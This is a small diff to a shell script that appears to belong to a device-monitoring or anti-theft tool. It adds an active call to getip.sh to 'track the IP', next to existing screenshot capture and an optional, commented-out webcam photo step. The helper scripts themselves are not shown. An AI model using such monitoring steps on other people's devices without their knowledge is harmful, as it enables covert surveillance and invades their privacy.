@@ -3,6 +3,9 @@
 # Uncomment the following line to capture a screenshot
 sh screenshot.sh 
 
+# Uncomment the following line to track the IP
+sh getip.sh
+
 # Uncomment the following line to capture a photo (requires permissions)
 # sh photo.sh 
 
